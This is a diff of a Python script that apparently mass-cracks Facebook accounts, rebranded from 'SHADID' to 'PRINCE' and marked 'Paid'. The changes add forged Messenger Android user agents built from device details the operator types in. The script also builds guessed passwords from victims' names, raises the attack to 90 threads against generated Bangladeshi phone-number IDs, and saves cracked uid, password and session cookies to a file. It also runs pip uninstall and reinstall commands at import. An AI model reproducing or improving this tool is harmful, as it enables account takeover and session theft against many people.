@@ -1,13 +1,16 @@
 import os, sys, uuid, re, random, time, string, json,base64
 from io import BytesIO
 try:
+	
+	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 	import requests, rich,certifi,pycurl
 except:
     os.system("git pull")
-    os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+    
     os.system("pip3 install requests rich certifi pycurl")
     
     import requests, rich,certifi,pycurl
+
 
 from rich import print
 from datetime import datetime
@@ -31,7 +34,7 @@ class sort:
    //___/ /  __     ( )   __      ___      ___    
   / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
  //       //      / / //   / / //       //        
-//       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Free[/r]\n{sort.line()}'''
+//       //      / / //   / / ((____   ((____{version}\n{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Paid[/r]\n{sort.line()}'''
         print(aci)
 
     def color():
@@ -43,7 +46,30 @@ class sort:
 
 
 
-
+def info():
+    sort.clear()
+    print('     [b]    [red1] WELCOME TO MY TOOL          ')
+    if not os.path.exists('device_info.txt'):
+        os.system('clear')
+        print(sort.logo())
+        print(" What is your android version ex 8,9,10")
+        version_ = input(' Type android version : ')
+        print(44 * '-')
+        print(" Your mobile model ex Techno LD7 or Oppo CPH2095 etc")
+        model_ = input(" Model name : ")
+        print(44 * "-")
+        print(" Your mobile company name ex Techno,Redmi")
+        brand_name_ = input(" Device company name : ")
+        print(44 * '-')
+        print(" Your mobile width ex 720,740,730,780 etc")
+        width_ = input(" Device width : ")
+        print(44 * '-')
+        print(" Your mobile height ex 1660,1780,1730 etc")
+        height_ = input(" Device height: ")
+        info_file = open("device_info.txt", "a").write(
+            version_ + '$' + model_ + '$' + brand_name_ + '$' + width_ + '$' + height_)
+    time.sleep(4)
+    sort.clear()
     # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]JOIN MESSANGER GROUP ... ")
     # os.system("xdg-open https://www.facebook.com/HeronAfridi.Official");time.sleep(2)
     # print("[deep_pink2][[orange3]▶[deep_pink2]] [chartreuse1]REVIEW TOOL OWNER ... ")
@@ -89,7 +115,23 @@ def ua():
 #Dalvik/2.1.0 (Linux; U; Android 13; Oppo CPH2095 Build/TW8A.198993.015) [FBAN/Orca-Android;FBAV/279.1.0.51.155;FBPN/com.facebook.orca;FBLC/en_US;FBBV/398105929;FBCR/MTN;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo CPH2095;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;]
 
 
-    
+for brand in range(1000):
+    a = random.choice(
+        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
+         'W', 'X', 'Y', 'Z'])
+    b = random.choice(
+        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
+         'W', 'X', 'Y', 'Z'])
+    c = str(random.randint(1,9))
+    d= str(random.randint(10,20))
+    abc = a+b+c
+    if not os.path.exists('device_info.txt'):
+    	 info()
+    else:
+        infos = open('device_info.txt', 'r').read()
+        version_, model_, brand_name_, width_, height_ = infos.split('$')
+        uaaa = "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/"+abc+"A."+str(random.randint(190000,199999))+".0"+d+") [FBAN/Orca-Android;FBAV/"+str(random.randint(200,350))+"."+str(random.randint(0,1))+".0."+str(random.randint(20,70))+"."+str(random.randint(110,280))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.randint(390000000,399999999))+";FBCR/MTN;FBMF/"+brand_name_+";FBBD/"+brand_name_+";FBDV/"""+model_+";FBSV/"+version_+";FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width="+width_+",height="+height_+"};FB_FW/1;]"
+        sys_ua.append(uaaa)
     
 
 
@@ -300,7 +342,10 @@ def file_sub(uid, pwx, name, meth, file):
             ls = fs
         for pw in pwx:
 
-            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',ls).replace('Name', name).replace('name', name.lower())
+            ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
+                                                                                                          ls).replace(
+                'Name', name).replace('name', name.lower())
+
             if meth in ["1", "01"]:
                 agent = shadid
             elif meth in ["2", "02"]:
@@ -398,7 +443,7 @@ def ran():
     else:
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]BD Number")
         print(sort.line())
-        print("[b]     [red1]✗ [chartreuse1]Type A BD Number EX   [orange3]▶  [chartreuse1]017, 018, 019")
+        print("[b]     [red1]✗ [chartreuse1]Type A BD Number EX   [orange3]▶  [chartreuse1]01718702440")
         code = str(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
         print("[b]     [red1]✗ [chartreuse1]How Many Do You Want To Clone EX   [orange3]▶  [chartreuse1]100000, 200000")
@@ -431,7 +476,7 @@ def ran():
     if meth in ["1", "a", "A"]:
     	mw = 30
     else:
-    	mw = 70
+    	mw = 90
     with ThreadPool(max_workers=mw) as heron:
         sort.clear()
         sort.logo()
@@ -452,7 +497,7 @@ def ren_sub(uid, pwx, meth, user, fb):
     shadid = random.choice(sys_ua)
     custom_agent = ""
     session = requests.Session()
-    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[SHADID-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
+    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
     sys.stdout.flush()
     try:
         for ps in pwx:
@@ -502,7 +547,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 xx=coki.split("c_user=")[1]
                 xd=xx[:15]
-                print(f"\r\r[SHADID-OK] {xd} <> {ps}\n[Cookies]{coki}")
+                print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}\n")
                 open("/sdcard/SD-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                 oks.append(xd)
                 break
@@ -520,7 +565,7 @@ def ren_sub(uid, pwx, meth, user, fb):
 
 
 def main():
-    
+    info()
     sort.clear()
     sort.logo()
     print(
